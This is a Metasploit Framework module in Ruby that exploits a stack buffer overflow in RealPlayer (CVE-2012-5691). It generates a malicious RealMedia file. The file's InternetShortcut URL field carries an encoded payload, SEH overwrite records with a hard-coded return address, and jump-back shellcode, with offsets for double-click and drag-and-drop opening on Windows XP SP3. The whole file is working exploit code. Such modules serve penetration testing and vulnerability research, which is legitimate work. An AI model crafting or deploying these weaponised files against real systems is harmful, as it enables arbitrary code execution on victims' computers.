##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
#   http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Seh

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'RealPlayer RealMedia File Handling Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack based buffer overflow on RealPlayer <=15.0.6.14.
				The vulnerability exists in the handling of real media files, due to the insecure
				usage of the GetPrivateProfileString function to retrieve the URL property from an
				InternetShortcut section.

				This module generates a malicious rm file which must be opened with RealPlayer via
				drag and drop or double click methods. It has been tested successfully on Windows
				XP SP3 with RealPlayer 15.0.5.109.
			},
			'License'        => MSF_LICENSE,
			'Author'         =>
				[
					'suto <suto[at]vnsecurity.net>' # Vulnerability discovery, metasploit module
				],
			'References'     =>
				[
					[ 'CVE', '2012-5691' ],
					[ 'OSVDB', '88486' ],
					[ 'BID', '56956' ],
					[ 'URL', 'http://service.real.com/realplayer/security/12142012_player/en/' ]
				],
			'DefaultOptions' =>
				{
					'ExitFunction' => 'process'
				},
			'Platform'       => 'win',
			'Payload'        =>
				{
					'BadChars'    => "\x00\x0a\x0d",
					'DisableNops' => true,
					'Space'       => 2000
				},
			'Targets'        =>
				[
					[ 'Windows XP SP3 / Real Player 15.0.5.109',
						{
							'Ret'       => 0x63f2b4b5, # ppr from rpap3260.dll
							'OffsetOne' => 2312, # Open via double click
							'OffsetTwo' => 2964 # Open via drag and drop
						}
					]
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Dec 14 2012',
			'DefaultTarget'  => 0))

		register_options([OptString.new('FILENAME', [ false, 'The file name.', 'msf.rm']),], self.class)

	end

	def exploit

		buffer = payload.encoded
		buffer << rand_text(target['OffsetOne'] - buffer.length) # Open the file via double click
		buffer << generate_seh_record(target.ret)
		buffer << Metasm::Shellcode.assemble(Metasm::Ia32.new, "call $-#{target['OffsetOne'] + 8}").encode_string
		buffer << rand_text(target['OffsetTwo'] - buffer.length) # Open the file via drag and drop to the real player
		buffer << generate_seh_record(target.ret)
		buffer << Metasm::Shellcode.assemble(Metasm::Ia32.new, "call $-#{target['OffsetTwo'] + 8}").encode_string
		buffer << rand_text(7000) # Generate exception

		content = "[InternetShortcut]\nURL="
		filecontent = content+buffer

		file_create(filecontent)

	end
end
